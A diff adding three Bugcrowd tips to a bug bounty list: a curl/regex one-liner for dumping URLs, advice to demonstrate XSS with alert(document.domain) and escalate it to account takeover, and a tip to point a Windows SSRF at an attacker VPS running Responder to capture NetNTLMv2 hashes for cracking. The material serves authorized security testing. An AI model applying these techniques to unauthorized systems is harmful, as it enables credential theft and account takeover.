@@ -2,6 +2,32 @@
 
 A curated list of technical/process tips that will level up your bounty game. For more, head [back to the main page](./README.md).
 
+## Dumping URLs with regex
+
+Source: https://twitter.com/Bugcrowd/status/1364809861964451849
+
+```
+Looking to quickly dump URLs from a webpage using curl and some regex magic!? Try: 
+
+curl -s https://www.bugcrowd[.]com | pcregrep -o "(http:\/\/|https:\/\/).*?(?=\"|'| )" | sort -u
+```
+
+## alert(1) -> alert(document.domain)
+
+Source: https://twitter.com/Bugcrowd/status/1367346572858695681
+
+```
+When you find an XSS, at minimum, use alert(document.domain) over alert(1). This helps to demonstrate the context that the JavaScript is executing in. Even better, escalate the XSS to perform an account takeover!
+```
+
+## SSRF -> Password Hashes
+
+Source: https://twitter.com/Bugcrowd/status/1368320520526180355
+
+```
+If you ever find a SSRF on a Windows box, try running http://responder.py on your own VPS, then send the SSRF to file://<yourvps>. With a bit of luck, the server will send you some tasty Windows NetNTLMv2 hashes to crack!
+```
+
 ## Common XXE Weakpoints
 
 Source: https://twitter.com/Bugcrowd/status/1342184648856616972
